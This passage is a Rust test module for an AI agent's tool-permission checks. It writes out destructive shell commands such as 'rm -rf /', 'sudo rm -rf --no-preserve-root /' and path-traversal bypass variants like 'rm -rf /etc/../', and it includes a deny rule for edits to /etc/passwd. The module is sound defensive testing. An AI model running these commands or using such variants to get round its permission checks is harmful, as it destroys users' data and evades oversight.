        t("rm -rf . /tmp/foo").is_deny();
        t("rm -rf .. /safe").is_deny();
    }

    #[test]
    fn hardcoded_allows_rm_multi_path_all_safe() {
        t("rm -rf /tmp /home/user")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf ./build ./dist")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
        t("rm -rf /var/log/app /tmp/cache")
            .mode(ToolPermissionMode::Allow)
            .is_allow();
    }

    #[test]
    fn hardcoded_blocks_rm_multi_path_with_traversal() {
        t("rm -rf /safe /tmp/../../").is_deny();
        t("rm -rf /tmp/../../ /safe").is_deny();
        t("rm -rf /safe /var/log/../../").is_deny();
    }

    #[test]
    fn hardcoded_blocks_user_reported_bypass_variants() {
        // User report: "rm -rf /etc/../" normalizes to "rm -rf /" via path traversal
        t("rm -rf /etc/../").is_deny();
        t("rm -rf /etc/..").is_deny();
        // User report: --no-preserve-root (without =value) should not bypass
        t("rm -rf --no-preserve-root /").is_deny();
        t("rm --no-preserve-root -rf /").is_deny();
        // User report: "rm -rf /*" should be caught (glob expands to all top-level entries)
        t("rm -rf /*").is_deny();
        // Chained with sudo
        t("sudo rm -rf /").is_deny();
        t("sudo rm -rf --no-preserve-root /").is_deny();
        // Traversal cannot be bypassed even with global allow or allow patterns
        t("rm -rf /etc/../").global(true).is_deny();
        t("rm -rf /etc/../").allow(&[".*"]).is_deny();
        t("rm -rf --no-preserve-root /").global(true).is_deny();
        t("rm -rf --no-preserve-root /").allow(&[".*"]).is_deny();
    }

    #[test]
    fn normalize_path_relative_no_change() {
        assert_eq!(normalize_path("foo/bar"), "foo/bar");
    }

    #[test]
    fn normalize_path_relative_with_curdir() {
        assert_eq!(normalize_path("foo/./bar"), "foo/bar");
    }

    #[test]
    fn normalize_path_relative_with_parent() {
        assert_eq!(normalize_path("foo/bar/../baz"), "foo/baz");
    }

    #[test]
    fn normalize_path_absolute_preserved() {
        assert_eq!(normalize_path("/etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_absolute_with_traversal() {
        assert_eq!(normalize_path("/tmp/../etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_root() {
        assert_eq!(normalize_path("/"), "/");
    }

    #[test]
    fn normalize_path_parent_beyond_root_clamped() {
        assert_eq!(normalize_path("/../../../etc/passwd"), "/etc/passwd");
    }

    #[test]
    fn normalize_path_curdir_only() {
        assert_eq!(normalize_path("."), "");
    }

    #[test]
    fn normalize_path_empty() {
        assert_eq!(normalize_path(""), "");
    }

    #[test]
    fn normalize_path_relative_traversal_above_start() {
        assert_eq!(normalize_path("../../../etc/passwd"), "../../../etc/passwd");
    }

    #[test]
    fn normalize_path_relative_traversal_with_curdir() {
        assert_eq!(normalize_path("../../."), "../..");
    }

    #[test]
    fn normalize_path_relative_partial_traversal_above_start() {
        assert_eq!(normalize_path("foo/../../bar"), "../bar");
    }

    #[test]
    fn most_restrictive_deny_vs_allow() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("x".into()),
                ToolPermissionDecision::Allow
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_allow_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Allow,
                ToolPermissionDecision::Deny("x".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_deny_vs_confirm() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("x".into()),
                ToolPermissionDecision::Confirm
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_confirm_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Confirm,
                ToolPermissionDecision::Deny("x".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_deny_vs_deny() {
        assert!(matches!(
            most_restrictive(
                ToolPermissionDecision::Deny("a".into()),
                ToolPermissionDecision::Deny("b".into())
            ),
            ToolPermissionDecision::Deny(_)
        ));
    }

    #[test]
    fn most_restrictive_confirm_vs_allow() {
        assert_eq!(
            most_restrictive(
                ToolPermissionDecision::Confirm,
                ToolPermissionDecision::Allow
            ),
            ToolPermissionDecision::Confirm
        );
    }

    #[test]
    fn most_restrictive_allow_vs_confirm() {
        assert_eq!(
            most_restrictive(
                ToolPermissionDecision::Allow,
                ToolPermissionDecision::Confirm
            ),
            ToolPermissionDecision::Confirm
        );
    }

    #[test]
    fn most_restrictive_allow_vs_allow() {
        assert_eq!(
            most_restrictive(ToolPermissionDecision::Allow, ToolPermissionDecision::Allow),
            ToolPermissionDecision::Allow
        );
    }

    #[test]
    fn decide_permission_for_path_no_dots_early_return() {
        // When the path has no `.` or `..`, normalize_path returns the same string,
        // so decide_permission_for_path returns the raw decision directly.
        let settings = test_agent_settings(
            ToolPermissions {
                tools: Default::default(),
            },
            false,
        );
        let decision = decide_permission_for_path(EditFileTool::NAME, "src/main.rs", &settings);
        assert_eq!(decision, ToolPermissionDecision::Confirm);
    }

    #[test]
    fn decide_permission_for_path_traversal_triggers_deny() {
        let deny_regex = CompiledRegex::new("/etc/passwd", false).unwrap();
        let mut tools = collections::HashMap::default();
        tools.insert(
            Arc::from(EditFileTool::NAME),
            ToolRules {
                default_mode: ToolPermissionMode::Allow,
                always_allow: vec![],
                always_deny: vec![deny_regex],
                always_confirm: vec![],
                invalid_patterns: vec![],
            },
        );
        let settings = test_agent_settings(ToolPermissions { tools }, false);

        let decision =
            decide_permission_for_path(EditFileTool::NAME, "/tmp/../etc/passwd", &settings);
        assert!(
            matches!(decision, ToolPermissionDecision::Deny(_)),
            "expected Deny for traversal to /etc/passwd, got {:?}",
            decision
        );
    }
}
